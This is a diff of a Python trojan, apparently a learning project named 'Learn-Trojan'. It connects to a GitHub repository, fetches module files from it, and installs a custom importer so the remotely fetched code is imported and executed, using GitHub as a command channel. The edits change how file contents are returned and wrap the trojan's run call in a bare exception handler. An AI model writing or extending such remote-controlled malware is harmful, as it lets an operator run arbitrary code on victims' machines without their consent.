@@ -18,11 +18,7 @@ def github_connect():
         return sess.repositories(user, 'Learn-Trojan')
 #function to get file contents from repositories
 def get_file_contents(dirname,module_name, repo):
-    file_contents = repo.file_contents(f'{dirname}/{module_name}')
-    if file_contents:
-        return file_contents.decoded.decode()
-    else:
-        return None
+    return repo.file_contents(f'{dirname}/{module_name}').content
     
 #create trojan class to performs trojaning task
 #create trojan object
@@ -114,4 +110,7 @@ class GitImporter:
 if __name__ == '__main__':
     sys.meta_path.append(GitImporter())
     trojan = Trojan('abc')
-    trojan.run()
+    try:
+        trojan.run()
+    except:
+        print("Something is make my program error")
